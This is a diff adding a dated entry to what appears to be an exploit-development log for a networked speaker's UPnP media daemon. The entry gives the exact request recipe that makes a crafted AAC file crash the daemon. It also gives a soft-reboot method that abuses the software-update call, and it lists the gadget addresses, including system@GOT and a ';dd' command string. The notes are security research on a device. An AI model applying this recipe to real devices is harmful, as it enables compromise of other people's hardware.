@@ -2706,3 +2706,43 @@ that needs a working transport.
 `jcell.aa` vehicle (F=`0x55000000`, cell at file 23656) as the single
 canary — a crash inside ~55 s proves the chain is live again, and only then
 does a band sweep make sense. `jcell.aa` is on the Mac payload dir and on css.
+
+### 2026-11-09 (session 20f) — the primitive is ALIVE; the exact fire recipe; a soft-reboot lever
+
+**The chain still fires.** `JFFSEX_84.aa` (the untouched 6 408-byte file)
+delivered with the correct recipe put the daemon down at **36 s**, the
+documented hit/miss signature. The exploit was never broken — the *rig* was.
+
+**The fire recipe (both halves are mandatory, proven by a 2×2):**
+
+| | shim URI | bare `http://` |
+|---|---|---|
+| DIDL with `audio/aac` | **SETAV 200 + PLAY 200** | SETAV 200 + PLAY **500** |
+| no DIDL | SETAV 200 + PLAY **500** | 500 |
+
+So: `x-rincon-mp3radio://http://<lan-host>/<file>` **and** a
+`CurrentURIMetaData` DIDL whose `res` carries
+`protocolInfo="http-get:*:audio/aac:*"` (exactly what `scripts/fire_aa.py`
+sends). Either one alone gives UPnP 701 → Play 500. Serve from the **LAN**.
+`scripts/fire_aa.py` now has `--no-shim` for the bare form.
+
+**Soft reboot (new, works):** `ZoneGroupTopology#BeginSoftwareUpdate` with
+`UpdateURL` = the **same-version genuine image** (`genuine-5723.upd`,
+5.6 MB). The unit goes down immediately, stays down ~80 s, and comes back on
+the same `57.23-74170` — a clean reboot without a version change, so the
+PPC addresses stay valid. This replaces the missing `/reboot` route and is
+the way to reset a wedged transport.
+
+**The observer-cell path is the broken one, not the direct path.**
+`jcell.aa` — JFFSEX zero-padded to 23 706 bytes with a cell at file 23656 and
+`F = 0x55000000` — plays (SETAV/PLAY 200) but never crashes, on a freshly
+rebooted daemon, while the unpadded JFFSEX fires in 36 s. So the 6 408-byte
+direct chain works and the 23 KB cell-carrying variant does not; the whole
+builder-generated 24 KB family inherits that. Calibration should therefore be
+driven from **JFFSEX's own structure**, not from `ppc_v5_builder.py`.
+
+JFFSEX's only embedded addresses, for that work (node offsets):
+`0` = `0x106c67dc`, `428` = B `0x106c69d0`, `500` = V `0x106c69ec` (the
+`;dd …` string), `6404` = A `0x106c6980`; `FN = system@GOT 0x105464b0` at
+`556`. None of them is a `0x106c4ef0`-style fake handler, so F is supplied
+outside the file.
